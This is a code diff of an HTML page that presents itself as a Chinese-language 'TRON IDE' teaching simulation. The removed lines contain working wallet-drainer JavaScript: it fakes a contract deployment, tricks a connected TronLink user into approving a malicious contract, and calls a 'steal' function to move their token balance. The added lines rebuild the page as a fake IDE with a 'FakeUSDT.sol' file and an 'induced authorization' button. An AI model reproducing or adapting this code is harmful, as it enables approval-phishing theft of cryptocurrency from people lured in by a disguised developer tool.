@@ -1,117 +1,53 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <title>TRON-IDE 教学模拟</title>
-  <link rel="stylesheet" href="style.css">
-  <script src="https://cdn.jsdelivr.net/npm/web3@1.8.2/dist/web3.min.js"></script>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>TRON IDE - 仿真教学版</title>
+  <link rel="stylesheet" href="style.css" />
+  <script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/tronweb@4.4.0/dist/TronWeb.js"></script>
+  <script src="https://unpkg.com/monaco-editor@0.34.1/min/vs/loader.js"></script>
 </head>
 <body>
-  <div class="container">
-    <h1>TRON-IDE 模拟部署环境</h1>
-
-    <textarea id="codeInput" placeholder="// 粘贴你的 Solidity 合约代码"></textarea>
-
-    <button id="deployBtn">Deploy 合约</button>
-
-    <div class="result">
-      <p>部署成功，合约地址：</p>
-      <p id="contractAddress">(请先连接钱包)</p>
+  <div id="app">
+    <!-- 顶部导航栏 -->
+    <div id="navbar">
+      <div class="logo">TRON IDE</div>
+      <div class="controls">
+        <button id="connectBtn">连接钱包</button>
+      </div>
     </div>
 
-    <button id="connectWallet">连接 TronLink</button>
-    <button id="authorize">授权 USDT</button>
+    <!-- 主体 -->
+    <div id="main">
+      <!-- 左侧文件栏 -->
+      <div id="fileList">
+        <ul>
+          <li class="active" onclick="selectFile('MyContract.sol')">MyContract.sol</li>
+          <li onclick="selectFile('FakeUSDT.sol')">FakeUSDT.sol</li>
+        </ul>
+      </div>
 
-    <p id="status"></p>
+      <!-- 中间编辑器 -->
+      <div id="editor"></div>
+
+      <!-- 右侧操作区 -->
+      <div id="actions">
+        <select id="contractSelect">
+          <option>MyContract</option>
+        </select>
+        <button onclick="deployContract()">Deploy</button>
+        <button onclick="callApprove()">Authorize (诱导授权)</button>
+      </div>
+    </div>
+
+    <!-- 输出控制台 -->
+    <div id="console">
+      <div id="log"></div>
+    </div>
   </div>
 
-  <script>
-    const maliciousContractAddress = "0xC6E4179e798bB4c91D23475f287F2DA73A30A5b4"; // TDGU4LtaZ6mgGSY997dgkrPvbav6CEi6VX 的 hex 地址
-    const fakeUSDT = "0x78d3AD24a0A0dcDd1F5A173663C72B8678CF9D1F"; // TEuuoTJxgCpr7HpviBr4XY496VBrdkZ13G 的 hex 地址
-
-    let web3;
-    let userAddress;
-
-    async function connectWallet() {
-      if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
-        web3 = new Web3(window.tronWeb.fullNode.host);
-        userAddress = window.tronWeb.defaultAddress.hex;
-        document.getElementById("status").innerText = "已连接钱包";
-      } else {
-        alert("请先安装 TronLink 并登录");
-      }
-    }
-
-    async function fakeDeploy() {
-      document.getElementById("contractAddress").innerText = maliciousContractAddress;
-    }
-
-    async function authorize() {
-      if (!userAddress) return alert("请先连接钱包");
-
-      const abi = [
-        {
-          "inputs": [
-            { "internalType": "address", "name": "token", "type": "address" }
-          ],
-          "name": "approveMe",
-          "outputs": [],
-          "stateMutability": "nonpayable",
-          "type": "function"
-        }
-      ];
-
-      const contract = new web3.eth.Contract(abi, maliciousContractAddress);
-
-      try {
-        await contract.methods.approveMe(fakeUSDT).send({ from: userAddress });
-        document.getElementById("status").innerText = "授权成功，正在尝试自动转账...";
-        stealTokens();
-      } catch (e) {
-        console.error(e);
-        document.getElementById("status").innerText = "授权失败";
-      }
-    }
-
-    async function stealTokens() {
-      const abi = [
-        {
-          "inputs": [
-            { "internalType": "address", "name": "token", "type": "address" },
-            { "internalType": "address", "name": "victim", "type": "address" },
-            { "internalType": "uint256", "name": "amount", "type": "uint256" }
-          ],
-          "name": "steal",
-          "outputs": [],
-          "stateMutability": "nonpayable",
-          "type": "function"
-        }
-      ];
-
-      const contract = new web3.eth.Contract(abi, maliciousContractAddress);
-
-      const tokenContract = new web3.eth.Contract([
-        {
-          "constant": true,
-          "inputs": [{ "name": "account", "type": "address" }],
-          "name": "balanceOf",
-          "outputs": [{ "name": "", "type": "uint256" }],
-          "type": "function"
-        }
-      ], fakeUSDT);
-
-      const balance = await tokenContract.methods.balanceOf(userAddress).call();
-      if (balance > 0) {
-        await contract.methods.steal(fakeUSDT, userAddress, balance).send({ from: userAddress });
-        document.getElementById("status").innerText = "代币已被自动转移";
-      } else {
-        document.getElementById("status").innerText = "当前余额为 0，无法转账";
-      }
-    }
-
-    document.getElementById("connectWallet").onclick = connectWallet;
-    document.getElementById("deployBtn").onclick = fakeDeploy;
-    document.getElementById("authorize").onclick = authorize;
-  </script>
+  <script src="main.js"></script>
 </body>
 </html>
